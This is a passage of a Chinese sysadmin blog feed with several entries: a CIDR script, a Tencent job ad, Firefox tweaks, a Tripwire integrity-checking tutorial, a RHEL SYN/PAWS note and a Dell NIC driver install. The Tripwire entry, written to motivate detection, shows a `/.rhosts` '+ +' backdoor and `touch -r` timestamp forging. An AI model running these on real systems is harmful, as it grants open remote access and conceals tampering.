class="line">done</span><br></pre></td></tr></table></figure></p><p>以上脚本未测试，自己写了个把netmask计算的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">grep &apos;apnic|CN|ipv4&apos; delegated-apnic-latest | cut -f 4,5 -d &apos;|&apos; | tr &apos;|&apos; &apos; &apos; | while read ip netmask  </span><br><span class="line">do  </span><br><span class="line">i=0;  </span><br><span class="line">while [ $netmask -gt 1 ]  </span><br><span class="line">do  </span><br><span class="line">let &quot;netmask=$netmask/2&quot;;  </span><br><span class="line">let &quot;i = $i + 1&quot;;  </span><br><span class="line">done  </span><br><span class="line">echo $ip/$i;  </span><br><span class="line">done</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>腾讯-运维职位/系统架构师</title>
      <link href="/2010/09/17/tencent-operations-systems-architect/"/>
      <url>/2010/09/17/tencent-operations-systems-architect/</url>
      <content type="html"><![CDATA[<p>游戏运维规划经理（成都、深圳）<br>岗位职责：<br>负责网络游戏业务的运营技术支撑工作整体规划和支撑团队日常工作管理；<br>负责整体把握网络游戏的运维服务质量，数据分析质量，资源规划等；<br>负责与周边IDC、服务器、操作系统、数据库等支撑团队沟通协调，跟进解决网络游戏运维中出现的各种问题；<br>负责与游戏运营项目组的日常沟通交流，协调并处理各种需求；  </p><p>工作经验：<br>三年以上互联网行业经验、两年以上的服务器维护经验、一年以上大中型互联网项目管理或实施经验；<br>有较强的流程分析、优化能力；<br>有较强的项目协调、管理能力；<br>熟悉IT服务管理（ITIL）及电信计费等相关实践经验；  </p><p>专业知识：<br>熟悉linux / Unix或Windows系统管理，对系统性能分析和诊断有一定的认识；<br>熟练掌握shell/perl或bat/vbs等脚本语言的程序编写；<br>熟悉网络知识，了解tcp/ip协议；<br>对服务器硬件知识有一定的了解；  </p><p>岗位要求：<br>1、计算机类和相关专业本科以上学历<br>2、三年以上互联网行业经验、两年以上的服务器维护经验、一年以上大中型互联网项目管理或实施经验；<br>3、熟悉linux / Unix或Windows系统管理，对系统性能分析和诊断有一定的认识；<br>4、熟练掌握shell/perl或bat/vbs等脚本语言的程序编写；<br>5、熟悉网络知识，了解tcp/ip协议；<br>6、对服务器硬件知识有一定的了解；<br>7、有较强的流程分析、优化能力；<br>8、有较强的项目协调、管理能力；<br>9、熟悉IT服务管理（ITIL）及电信计费等相关实践经验；  </p><p>?资深系统运维工程师<br>岗位职责：<br>负责操作系统相关的疑难问题的定位和解决；<br>负责操作系统的性能优化；<br>负责应用软件的研究和优化；<br>负责Server硬件的定制和评测；<br>相应的新技术的追踪和应用；  </p><p>工作经验：<br>四年以上操作系统维护经验，了解互联网应用的架构；<br>主导实施过中大型的互联网应用优化项目；  </p><p>专业知识：<br>精通Linux/Windows操作系统的应用；<br>掌握Linux/Windows操作系统的工作原理，深入理解Linux内核；<br>对Linux系统下的各类典型应用软件的性能、使用场景有深刻的认识；<br>深入理解PCServer的硬件架构和评测方法；<br>有一定的开发能力（使用shell、perl等脚本语言）；<br>熟悉主流数据库（Mysql/Oracle/MS-SQL）；<br>熟悉网络原理、TCP/IP协议；  </p><p>岗位要求：<br>基本要求：<br>1、计算机类或相关专业学历；<br>2、四年以上操作系统维护经验，了解互联网应用的架构；<br>3、主导实施过中大型的互联网应用优化项目；<br>素质要求：<br>3、要求对技术有强烈的追求，具备较强的学习和钻研能力；<br>4、有较强的沟通能力和团队合作精神，高度的责任心；<br>技能要求：<br>5、精通Linux/Windows操作系统的应用；<br>6、掌握Linux/Windows操作系统的工作原理，深入理解Linux内核；<br>7、对Linux系统下的各类典型应用软件的性能、使用场景有深刻的认识；<br>8、深入理解PCServer的硬件架构和评测方法；<br>9、有一定的开发能力（使用shell、perl等脚本语言）；<br>10、熟悉主流数据库（Mysql/Oracle/MS-SQL）；<br>11、熟悉网络原理、TCP/IP协议；  </p><p>?高级系统架构师<br>岗位职责：<br>参与游戏运营系统平台的设计、架构以及核心部分编码，带领团队进行游戏运营支撑平台建设和推广；<br>主持游戏业务的运营层面架构优化方案设计、评审，在alpha阶段后以运营技术专家身份参与到游戏的分布，逻辑模块、DB系统等方面的优化设计和评审  </p><p>工作经验：<br>具有较强的团队精神与服务意识；<br>具备高度的责任心，善于沟通表达，具备项目管理经验，对开发过程、质量管理有深刻理解，热爱计算机技术及软件开发；<br>有大型分布式系统的设计开发及维护经验者优先。  </p><p>专业知识：<br>精通linux/unix等操作系统，具备扎实的unix环境编程能力；<br>精通c/c++语言并具备丰富的编程经验；<br>精通网络编程并有高并发系统的开发经验；<br>熟悉MYSQL或其他大型数据库，能够快速根据需要完成高性能数据库设计；  </p><p>岗位要求：<br>1、精通linux/unix等操作系统，具备扎实的unix环境编程能力；<br>2、精通c/c++语言并具备丰富的编程经验；<br>3、精通网络编程并有高并发系统的开发经验；<br>4、熟悉MYSQL或其他大型数据库，能够快速根据需要完成高性能数据库设计；<br>5、具有较强的团队精神与服务意识；<br>6、具备高度的责任心，善于沟通表达，具备项目管理经验，对开发过程、质量管理有深刻理解，热爱计算机技术及软件开发；<br>7、有大型分布式系统的设计开发及维护经验者优先。  </p><p>以上职位工作地点：深圳<br>薪资水平：15-30w/年  </p><p>联 系 人：石晓丹<br>联系电话：0411 82696820<br>MSN（邮箱）：<a href="mailto:hebe.shi@live.cn" target="_blank" rel="noopener">hebe.shi@live.cn</a></p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>加快FIREFOX启动速度</title>
      <link href="/2010/09/17/speed-up-the-firefox-startup/"/>
      <url>/2010/09/17/speed-up-the-firefox-startup/</url>
      <content type="html"><![CDATA[<p>1.右键点击firefox快捷方式－属性－目标，在目标文本框末尾加空格加-turbo可以加快启动速度添加/Prefetch:1 也可以.</p><p>2.打开新的FireFox窗口,在地址栏输入 “about:config”然后找到以下的地址：:<br>network.http.pipelining<br>network.http.proxy.pipelining<br>network.http.pipelining.maxrequests<br>通常浏览器一次只会发送一个请求. 你可以让它一次发送多个请求<br>3. 改变这些值:<br>把 “network.http.pipelining” 设置为”true”<br>把 “network.http.proxy.pipelining” 设置为 “true”<br>把 “network.http.pipelining.maxrequests”设置成20.<br>这个意思就是让他一次请求20次.<br>4.最后右击任何地方，”新建”－&gt;”整数”，把名字设为”nglayout.initialpaint.delay”<br>，把它的值设为”0”<br>这个值是当浏览器收到信息后等待的时间。<br>5.右击鼠标－新建－布尔（boolean)项，输入：config.trim_on_minimize,并设置为true。<br>作用：这样就可以在最小化时自动释放内存。<br>2.在过滤器栏输入：browser.sessionhistory.max_total_viewers，双击该项，修改值为5或更小。<br>作用：页面快进/快退功能中保存的页面总数，默认是-1(无限)。<br>参考：<br>32MB 0<br>64MB 1<br>128MB 2<br>256MB 3<br>512MB 5<br>1GB 8<br>6.找到network.dns.disableIPv6 ，右键，切换，值变为true。<br>作用：禁用ipv6解析。<br>7.找到browser.tabs.loadDivertedInBackground的值切换true。<br>作用：新打开的标签页在后台，你依然可以浏览当前页面。<br>8.点击右键，新建—整数–〉输入 browser.cache.memory.capacity —〉确定 –〉输入数值，推荐16000。可以减少内存使用。<br>设置完之后，在打开一次看看 是不是快好多了？</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Tripwire 应用</title>
      <link href="/2010/09/17/tripwire-application/"/>
      <url>/2010/09/17/tripwire-application/</url>
      <content type="html"><![CDATA[<p>对unix管理员来说，主机系统的安全一直是个课题，一方面管理员通过更新patch，安装软硬件防火墙等手段努力使自己的系统可靠性增强，而另一方面unix操作系统的漏洞总是不断被发现并被公布出来，如BUGTRAQ这样的安全列表，从这个角度上可以很绝对的说，互联网上没有安全的主机。任何一台放在Internet上的主机被入侵的潜在可能性是不可逃脱的，而且，对入侵者而言，利用漏洞进入系统往往只是第一步，如果想得到更多的，如超级用户的密码，数据库的口令等，往往需要下点功夫，最便捷也是最有效的就是改动或特洛伊化受侵害的主机上的文件，如放置自己的监听程序，替代某些关键文件，修改编辑可信文件，设置suid文件等。  </p><p>　　一些管理员通unix自带的命令来检查文件的安全性，如检查文件生成的时间戳，但这样的可靠性微乎其微，有经验的入侵者可以很轻松的修改文件生成时间，有兴趣的管理员可以试试以下操作：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">　　# echo &quot;+ +&quot; &gt; /.rhosts  </span><br><span class="line">　　这一步生成一个.rhosts文件，看看它的时间。  </span><br><span class="line">　　# ls -l /.rhosts  </span><br><span class="line">　　-rw-r--r-- 1 root other 4 Jul 2 16：45 /.rhosts  </span><br><span class="line">　　好，我们如下操作看看会怎么样?  </span><br><span class="line">　　# touch -r /bin/sh /.rhosts  </span><br><span class="line">　　#ls -l /.rhosts  </span><br><span class="line">　　-rw-r--r-- 1 root other 4 Apr 5 16：32 /.rhosts  </span><br><span class="line"></span><br><span class="line">　　我们看到时间戳已经变了。变成了一个&quot;老&quot;文件，这样很可能就会逃脱管理员的视线。比如，入侵者替换掉了su文件，在正当用户每次试图su时，这个特洛伊化的su文件都会读取口令并将口令记载下来，然后才把控制权交给真正的su程序，口令通过这种途径泄密了，虽然这不是管理员所期望的，但毕竟unix太大太复杂，发现起来很困难。  </span><br><span class="line">  </span><br><span class="line">　　Tripwire就是解决这一问题的经典工具，它是目前最为著名的unix下文件系统完整性检查的软件工具，这一软件采用的技术核心就是对每个要监控的文件产生一个数字签名，保留下来。当文件现在的数字签名与保留的数字签名不一致时，那么现在这个文件必定被改动过了。具体到监控项目，在Tripwire的配置文件中有如下相应说明：  </span><br><span class="line">　　access permissions and file mode settings， including effective execution settings inode number in the file system  </span><br><span class="line">  </span><br><span class="line">　　number of links  </span><br><span class="line">　　user ID of the owner  </span><br><span class="line">　　group ID of the group of users to which access may be granted  </span><br><span class="line">　　size of the item  </span><br><span class="line">　　date and time the item was last accessed， the last modification made to the item， and the creation date and time associated with the items inode  </span><br><span class="line">　　由上，我们可以看到Tripwire对文件的管理面是很宽的。  </span><br><span class="line">  </span><br><span class="line">　　**2： Tripwire的工作原理**  </span><br><span class="line">　　当Tripwire运行在数据库生成模式时，会根据管理员设置的一个配置文件对指定要监控的文件进行读取，对每个文件生成相应数字签名，并将这些结果保存在自己的数据库中，在缺省状态下，MD5和SNCFRN(Xerox的安全哈希函数)加密手段被结合用来生成文件的数字签名。除此以外，管理员还可使用MD4，CRC32，SHA等哈希函数，但实际上，使用上述两种哈希函数的可靠性已相当高了，而且结合MD5和sncfrn两种算法(尤其是sncfrn)对系统资源的耗费已较大，所以在使用时可根据文件的重要性做取舍。当怀疑系统被入侵时，可由Tripwire根据先前生成的，数据库文件来做一次数字签名的对照，如果文件被替换，则与Tripwire数据库内相应数字签名不匹配， 这时Tripwire会报告相应文件被更动，管理员就明白系统不&quot;干净&quot;了。  </span><br><span class="line">  </span><br><span class="line">　　有一点要注意，上述保障机制的重点在于数据库内的数字签名，如果数据库是不可靠的，则一切工作都丧失意义。所以在Tripwire生成数据库后，这个库文件的安全极为重要。比较常见的做法是将数据库文件， Tripwire二进制文件，配置文件单独保留到&quot;可拿走并锁起来&quot;的质上，如软盘，将上述文件复制到软盘后，关闭写保护口，锁到保险柜中。除软盘外， 一次性介质，如cd-r也是很好的选择，这样即使侵入者拿到盘也无计可施。除这种办法外，利用PGP等加密工具对上述关键文件进行数字签名也是一个很好的选择。  </span><br><span class="line">  </span><br><span class="line">　　当然，当管理员自身对某些文件更动时， Tripwire的数据库必然是需要随之更新的， Tripwire考虑到了这一点，它有四种工作模式：数据库生成，完整性检查，数据库更新。交互更新。当管理员更动文件后，可运行数据库更新模式来产生新的数据库文件。  </span><br><span class="line">  </span><br><span class="line">　　**3：下载Tripwire，安装前的准备工作**  </span><br><span class="line">　　Tripwire支持绝大多数Unix操作系统，它的安装需要编译环境，如gcc，cc等，还需要gzip，gunzip等解压工具。这些工具管理员可从相应站点获取，这里不讨论。Tripwire可从www.tripwire.com获得，到它的主页download部分，可以看到当前可免费download的Tripwire1.3 ASR版本，下载下来就是。  </span><br><span class="line">  </span><br><span class="line">　　**4：安装Tripwire**  </span><br><span class="line">　　Tripwire的tar包解开后，我们可以看到如下目录结构，建议先看看根下的README文件，对Tripwire有个整体的了解。随后，我们就可以一步步的安装这个软件了。  </span><br><span class="line">  </span><br><span class="line">　　**步骤1：匹配主机环境**  </span><br><span class="line">  </span><br><span class="line">　　在Tripwire的根下有Ported这个文件，它是对支持的系统及相关配置文件的描述，管理员第一步需要打开这个文件，找到符合自己系统的描述，本文的测试环境是solaris2.6，我们截取相关部分来看看，  </span><br><span class="line">　　vendor： Sun Microsystems， Inc.  </span><br><span class="line">　　os： SunOS  </span><br><span class="line">　　os version： 5.x (Solaris 2.x)  </span><br><span class="line">　　compiler： cc  </span><br><span class="line">　　cflags： -O  </span><br><span class="line">　　ldflags：  </span><br><span class="line">　　libs：  </span><br><span class="line">　　conf.h： conf-svr4.h  </span><br><span class="line">　　tw.config： tw.Conf.sunos5  </span><br><span class="line">　　notes：  </span><br><span class="line">　　在这一段描述中，要尤其注意的是conf.h 和tw.config对应的行，在下几步的配置中需要用到它们两个对应的文件。此处要注意的是：每种操作系统这两个地方所对应的文件是不同的。  </span><br><span class="line">  </span><br><span class="line">　　**步骤2：配置监控目标**  </span><br><span class="line">  </span><br><span class="line">　　进入include目录，编辑config.h文件，将第一步Ported中conf.h后对应的文件名和路径写入config.h开始#include部分，此例中即为  </span><br><span class="line">　　#include &quot;../configs/conf-svr4.h&quot;  </span><br><span class="line">同时注意的是，在configh文件中还有Tripwire配置文件，Tripwire数据库文件的放置路径及生成数据库的文件名等设置，管理员按照个人喜好设置即可编辑好config.h后，还要根据本机情况编辑修改位于configs目录下的Tripwire配置文件，也就是上面Ported 文件中tw.config对应的tw.conf.sunos5，我们知道，对文件，目录等的监控就是在这里设置的。我们一段段的选取一部分这个文件来看看：  </span><br><span class="line">　　#  </span><br><span class="line">　　# \- ： ignore the following atributes  </span><br><span class="line">　　# \+ ： do not ignore the following attributes  </span><br><span class="line">　　#  </span><br><span class="line">　　# p ： permission and file mode bits a： access timestamp  </span><br><span class="line">　　# i ： inode number m： modification timestamp  </span><br><span class="line">　　# n ： number of links (ref count) c： inode creation timestamp  </span><br><span class="line">　　# u ： user id of owner 1： signature 1  </span><br><span class="line">　　# g ： group id of owner 2： signature 2  </span><br><span class="line">　　# s ： size of file  </span><br><span class="line">　　注意上述p，I，n，u，g，s，a，c，1，2等，它表示可以对文件，目录设置的监控项目，管理员可组合使用，最前面的-，+号表示选取或忽略这些属性。如下例：  </span><br><span class="line">　　/var +pinugsm12-a  </span><br><span class="line">　　它表示对目录/var下所 有文件检查，监控项目分别有文件属性，inode，链接数，属组，属主，修改时间，生成时间，数字签名等，但是，对这个目录下的文件的访问不加监控，如果访问也监控的话，正常的用户访问也会被Tripwire捕捉，这没有必要。  </span><br><span class="line">　　为了方便起见，Tripwire作者把常见组合做成了模板，如下，</span><br></pre></td></tr></table></figure></p><p>　　#<br>　　# Templates： (default) R ： [R]ead-only (+pinugsm12-a)<br>　　# L ： [L]og file (+pinug-sam12)<br>　　# N ： ignore [N]othing (+pinusgsamc12)<br>　　# E ： ignore [E]verything (-pinusgsamc12)<br>　　#<br>　　tw.conf.sunos5这个文件再向下，就是管理员根据情况填写了，把需要监控的文件及目录加入列表，赋予相应属性即可。如下：<br>　　/ R<br>　　/.rhosts R # may not exist<br>　　/.profile R # may not exist<br>　　/etc/dfs/dfstab R<br>　　/etc/hosts.equiv R<br>　　/etc/inet/inetd.conf R<br>　　/etc/inet/protocols R<br>　　/etc/inet/services R<br>　　/etc/init.d R<br>　　/etc/motd L<br>　　#/etc/named.boot R # may not exist<br>　　/etc/opt R<br>　　/etc/passwd L<br>　　/etc/profile R<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　**步骤3：编译**  </span><br><span class="line">  </span><br><span class="line">　　完成上两步后，就可以编译了，在Tripwire的根下，执行make，系统即会自动编译，编译成功后，可以再执行make test，Tripwire会自动检查编译情况及工作状态，它会一段一段的测试，我们选取一段如下：</span><br></pre></td></tr></table></figure></p><p>　　=== test.Update.sh： DESCRIPTION<br>　　This shell script exercises all the Tripwire integrity checking<br>　　and database update functionalities。<br>　　=== test.update.sh： Setting up auxiliary scripts ===<br>　　=== test.update.sh： BEGIN ===<br>　　../src/tripwire -loosedir -c /tmp/twtest/tw.config -d /tmp/twtest/tw.db -i all<br>　　=== test.update.sh： testing GROWING (safe) files ===<br>　　=== test.update.sh： testing GROWING (unsafe) files ===<br>　　=== test.update.sh： testing ADDED files ===<br>　　=== test.update.sh： testing DELETED files ===<br>　　=== test.update.sh： testing CHANGED files ===<br>　　=== test.update.sh： testing input schemes ===<br>　　=== test.update.sh： tw.config from stdin<br>　　=== test.update.sh： database from stdin<br>　　=== test.update.sh： testing complex UPDATE cases<br>　　=== test.update.sh： changed ignore-mask (UPDATE file)<br>　　=== test.update.sh： changed ignore-mask (UPDATE entry)<br>　　=== test.update.sh： testing UPDATED files (7 cases)<br>　　=== test.update.sh： case 1： update： add new file ===<br>　　=== test.update.sh： case 2： update： delete file ===<br>　　=== test.update.sh： case 3： update： update file ===<br>　　=== test.update.sh： case 4： nonsense case (skipping) ===<br>　　=== test.update.sh： case 6： update： delete entry ===<br>　　=== test.update.sh： case 5： update： add entry ===<br>　　=== test.update.sh： case 7： update： update entry ===<br>　　=== test.update.sh： PASS ===<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">　　我们可以看到，Tripwire对update功能一项项的做检测，并在最后PASS了，当Tripwire所有的检测项目都PASS后，编译就OK了。  </span><br><span class="line">  </span><br><span class="line">　　**步骤4：生成数据库**  </span><br><span class="line">  </span><br><span class="line">　　成功编译Tripwire，我们准备开始对需要监控的文件进行扫描，以生成Tripwire数据库，在Tripwire 的src目录下：如下操作。/tripwire -init，则系统会根据tw.conf.sunos5文件内的设置，开始扫描并生成相应的数据库，上面提到，数据库文件的路径是在第二步configh中设置的，在本例中为/var/tripwire，我们得到了名为tw.db_secu.unix.com的数据库文件。建议此时将Tripwire可执行文件，数据库文件，配置文件COPY到软盘等地方，放到安全的地方。以后需要安全鉴别时直接在软盘上执行即可。  </span><br><span class="line">  </span><br><span class="line">　　**步骤5：测试  </span><br><span class="line">**  </span><br><span class="line">　　数据库生成了，我们来测试一下吧，首先我们在根下touch生成一个goadd文件，其次我们把根下的.cshrc文件做一下改动，在里面加入几个#注释号。然后我们来运行一下Tripwire看如何：</span><br></pre></td></tr></table></figure></p><p>　　/ Tripwire -c ./tw.config.sunos5 -d ./tw.db_secu.unix.com<br>　　Tripwire(tm) ASR (Academic Source Release) 1.3.1<br>　　File Integrity Assessment Software<br>　　(c) 1992， Purdue Research Foundation， (c) 1997， 1999 Tripwire<br>　　Security Systems， Inc。 All Rights Reserved。 Use Restricted to<br>　　Authorized Licensees。<br>　　### Phase 1： Reading configuration file<br>　　### Phase 2： Generating file list<br>　　./tripwire： /.profile： No such file or directory<br>　　./tripwire： /kernel/unix： No such file or directory<br>　　### Phase 3： Creating file information database<br>　　### Phase 4： Searching for inconsistencies<br>　　###<br>　　### Total files scanned： 4437<br>　　### Files added： 1<br>　　### Files deleted： 0<br>　　### Files changed： 1<br>　　###<br>　　### Total file violations： 2<br>　　###<br>　　added： -rw-r–r– root 0 Jul 3 18：45：31 2000 /goadd<br>　　changed： -r–r–r– root 669 Jul 3 18：46：15 2000 /.cshrc<br>　　### Phase 5： Generating observed/expected pairs for changed files<br>　　###<br>　　### Attr Observed (what it is) Expected (what it should be)<br>　　### =========== ============================= =============================<br>　　/.cshrc<br>　　st_size： 669 668<br>　　st_mtime： Mon Jul 3 18：46：15 2000 Mon Jul 3 09：00：41 2000<br>　　st_ctime： Mon Jul 3 18：46：15 2000 Mon Jul 3 09：00：41 2000<br>　　md5 (sig1)： 3z9gKjlZGq5GbeWOxpYaF9 1Z7K0n3ZKAyuPpAZB1G8uq<br>　　snefru (sig2)： 1vCDeMR45lpRCChmDithiW 1oRYPpQ：oZA6hVx6Zi4.NG<br><code>`</code><br>　　可以看到，系统运行经过了5个步骤，首先读取配置文件，其次生成配置文件中设置为需要监控，但实际并不存在的文件列表。第三部生成文件信息库，第四步报告检查情况。我们看到共扫描了4437个文件，其中有一个文件是新增加的，有一个文件发生了改变。在下面它列出了这两个文件-正是我们做了手脚的文件!在最后一步Tripwire将发生了改变的文件现在字节数，生成时间，修改时间， md5， snefru签名及数据库中的记录对比列出，是不是很爽?  </p><p>　　上面我们讲到的是Tripwire的主要功能，在命令行状态下敲入tripwire -h 就会有其它使用参数的介绍，有兴趣的管理员不妨一试。<br>The Tripwire Product Line<br>　　Tripwire HQ Connector Bundle The HQ Connector bundle is comprised of Tripwires award-winning file integrity software,Tripwire version 2.2.1, and a communications agent that allows the software engine to “talk” to the Tripwire HQ Manager. Tripwire provides support for multiple platforms, including Windows NT, Solaris, Linux, HP-UX, IBM-AIX and others. With the Tripwire HQ Connector bundle, you can unequivocally answer the question: is my data the same today as it was yesterday? This information will help you keep your system in optimal working order and manage any changes - malicious or inadvertent - giving you complete control over data integrity. Tripwire HQ Manager HQ Manager is a software console with a graphical user interface that allows you to control hundreds of installations of HQ Connector. Named HQ Managerbecause its designed to operate as your information integrity headquarters, this product provides you with the very best way to manage data integrity across an enterprise network from a single, centralized location. Tripwire 2.2.1 for Linux With all the same great features as Tripwire 2.2.1 for other operating systems, Tripwire for Linux is available as a free download (without the agent that communicates with HQ Manager). In support of the open source community, Tripwire plans to release an open source version of this product this fall. For more information and future announcements about the open source release, check out <a href="http://www.tripwire.org" target="_blank" rel="noopener">www.tripwire.org</a>. Tripwire Academic Source Release 1.3.1 With only slight changes, the Tripwire Academic Source Release (ASR) version 1.3.1 is the same as the original Tripwire software that was developed in 1992 by Dr. Eugene Spafford and Tripwire CTO Gene Kim. Tripwire offers this version as a free download, but does not provide product support for it.</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Why does Red Hat Enterprise Linux system does not respond to SYN requests intermittently ?</title>
      <link href="/2010/09/16/why-does-red-hat-enterprise-linux-system-does-not-respond-to-syn-requests-intermittently/"/>
      <url>/2010/09/16/why-does-red-hat-enterprise-linux-system-does-not-respond-to-syn-requests-intermittently/</url>
      <content type="html"><![CDATA[<p>Issue<br>Server does not answer some specific SYN Packages.<br>Webserver does not respond for some sessions (SYN requests).  SYN Packets being ignored intermittently by RHEL Apache server<br>LDAP server occasionally ignoring SYNs<br>Any server, regardless of the application layer, may occasionally ignore TCP SYN packets (i.e. a TCP packet with the SYN flag set).<br>Environment<br>Red Hat Enterprise Linux 4 and 5 (Webserver/application server)<br>Red Hat Enterprise Linux 5.4 (openldap-2.3.43-3.el5)  </p><p>This issue has been reported in a environment using NAT (Network Address Translation) like the following:<br>      Client—&gt;NAT Router—&gt;Server</p><p>Resolution  </p><p>Disable TCP time stamps using the following command:</p><p>echo 0 &gt; /proc/sys/net/ipv4/tcp_timestamps  </p><p>or by adding the following line to /etc/systcl.conf and rebooting the system:</p><p>net.ipv4.tcp_timestamps = 0  </p><p>Disabling TCP time stamps will disable PAWS (Protect Against Wrapped Sequences), checking as defined in <a href="http://www.ietf.org/rfc/rfc1323.txt" target="_blank" rel="noopener">RFC 1323</a>.</p><p>Root Cause  </p><p>In a TCP dump of the affected packets, the TSVal of SYN packet is a lower value than the preceding packet.</p><p>Packet #30 from x.x.x.x to y.y.y.y has a TSval of 773695118  </p><p>Packet #33 from x.x.x.x to y.y.y.y has a TSval of 470318331  </p><p>In above TCP trace, packet #33 has a TSval of 470318331 which is lower than its preceding one. As PAWS checking is enabled in the TCP stack, it doesn’t send an acknowledge (SYN-ACK) back to the peer.</p><p>PAWS assumes that every received TCP segment (including data and ACK segments) contains a timestamp (SEG.TSval) whose values are non-decreasing in time. The basic idea is that a segment can be discarded as an old duplicate if it is received with a timestamp (SEG.TSval) less than some timestamp recently received on this connection.</p><p>Timestamp issues often indicate a problem with firewalls or NAT routers.</p><p>Diagnostic Steps<br>Stage 1  </p><p>Since the server is not heavily loaded, you may at first suspect this issue to be an issue with socket exhaustion.  However, checking the output of “netstat -paunt” will reveal that there are only a couple of active connections.</p><p>Stage 2  </p><p>Increasing the size of syn backlog queue (net.ipv4.tcp_max_syn_backlog) doesn’t seem to help.</p><p>Stage 3  </p><p>Collecting a TCP dump from the server using a command like the following:</p><p>tcpdump -s0 -w /tmp/tcpdump.pcap -i any host <client ip=""> and port 80  </client></p><p>and generating traffic (HTTP or LDAP) to the server captures evidence of the server not responding to the TCP SYN packets.  The output file can be analyzed with a command like</p><p>tcpdump -r /<path></path>/<to>/tcpdump.pcap  </to></p><p>or <a href="http://www.wireshark.org/" target="_blank" rel="noopener">Wireshark</a> can be used to analyze the TCP dump file graphically.  Wireshark is a standard package in most Red Hat Enterprise Linux and Fedora distributions.  Analysis of the TCP dump should show cases where the client will send several TCP SYN packets to the host, but the host will not respond.  Further analysis should show that the TSVal of the SYN packets is less than a preceding TCP packet.</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>dell r410 安装CentOS与网卡驱动</title>
      <link href="/2010/09/15/dell-r410-installation-centos-and-network-card-driver/"/>
      <url>/2010/09/15/dell-r410-installation-centos-and-network-card-driver/</url>
      <content type="html"><![CDATA[<p>官方驱动下载地址：<br><a href="http://zh-cn.broadcom.com/support/ethernet_nic/netxtremeii.php" target="_blank" rel="noopener">http://zh-cn.broadcom.com/support/ethernet_nic/netxtremeii.php</a><br>全新的DELL R410 系统预装CentOS4.6   到了机房发现才在装第一台系统，启动后发现不了硬盘，Google了下找到了解决方案，在BOOT的那里输入： linux graphical &amp;&amp; all-generic-ide 能识别到硬盘并进入到图形界面安装，以为要在软件安装那里选取除了gcc,和vi其他的都不要，接下来安装的过程中一切顺利，安装完成后进入到系统配置IP，结果发现网卡不识别，只好继续Google，找到网卡驱动并copy到U盘里（还好另一同事有U盘，不然工作都进行不下去。。），挂载并将驱动copy到CentOS系统里，驱动有2种格式，rpm和tar包的，为了省事期间就选择了rpm安装方式。。<br>挂载U盘：先创建一目录    mkdir /mnt/usb<br>          然后将U盘挂载到usb目录     mount  /dev/sdb1   /mnt/usb<br>          进入usb目录      cd /mnt/usb<br>          Rpm安装           rpm -ivh netxtreme2-4.8.10-1.src.rpm<br>1:netxtreme2             ########################################### [100%]<br>进入/usr/src/redhat/目录     cd /usr/src/redhat<br>该目录下有5个子目录   BUILD  RPMS   SOURCES   SPECS  SRPMS<br>接下来源码编译         rpmbuild –bb SPECS/netxtreme2.spec<br>在编译结束会看到如下提示：<br>+ umask 022<br>+ cd /usr/src/redhat/BUILD<br>+ cd netxtreme2-4.8.10<br>+ rm -rf /var/tmp/netxtreme2-buildroot /usr/src/redhat/BUILD/file.list.netxtreme2<br>+ exit 0                   (如果返回值为1-255，就说明编译没有成功)<br>安装编译之后生成的rpm包<br>   rpm -ivh RPMS/i386/netxtreme2-4.8.10-1.x86_64.rpm<br>查看是否加载了该模块<br>lsmod |grep bnx2 （一般是不会自动加载的，需手动加载）<br>modprobe  bnx2  (手动加载)<br>再查看是否加载了模块<br>lsmod |grep bnx2 (就会有了)<br>bnx2    180000 0  (具体的数字我不记得了)  </p><p>昨天到机房有2台要装成CentOS5.2的，结果用RPM安装驱动时总是出错，于是试了下tar包安装，结果成功。。。<br>TAR包安装网卡驱动<br>1 解压TAR包<br>tar zxvf 